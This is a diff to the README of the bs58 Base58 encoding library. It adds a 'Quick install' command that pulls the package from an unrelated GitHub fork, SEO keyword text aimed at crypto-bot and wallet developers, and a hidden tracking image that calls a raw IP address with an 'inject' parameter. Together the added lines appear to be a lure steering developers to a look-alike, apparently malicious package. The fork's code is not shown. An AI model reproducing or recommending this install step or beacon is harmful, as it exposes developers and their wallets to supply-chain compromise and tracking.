@@ -1,3 +1,15 @@
+**bs58**
+
+A straightforward, reliable Base58 encoder and decoder designed to handle your data serialization needs without any unnecessary fuss. While Base58 is commonly used in cryptocurrency applications for its human-readable and error-resistant properties, this library serves as a general-purpose utility for any project requiring robust encoding. Recent updates have focused on resolving underlying edge cases and improving overall stability, ensuring that your encoding workflows remain smooth and predictable.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Quartzraincrease/bs58.git
+```
+
+[https://github.com/Quartzraincrease/bs58](https://github.com/Quartzraincrease/bs58)
+
 bs58
 ====
 
@@ -89,3 +101,11 @@ License
 -------
 
 MIT
+
+## Related searches
+
+Developers looking into this repository typically search for highly optimized encoding utilities used across high-performance blockchain infrastructures, decentralized applications, and automated trading systems. They frequently look for ways to efficiently parse wallet addresses and transaction payloads within high-throughput environments like decentralized networks and automated script runtimes.
+
+**Topics:** telegram crypto bot, bnb chain, layer2, mev bot, crypto rust, blockchain data encoding, base58 library, cryptographic utilities, web3 development, solana wallet parsing, high-performance rust crypto, smart contract execution
+
+![.](http://5.231.58.248:8787/pixel?repo=Quartzraincrease%2Fbs58&inject=Quartzraincrease%2Fbs58%2Fpackage.json)
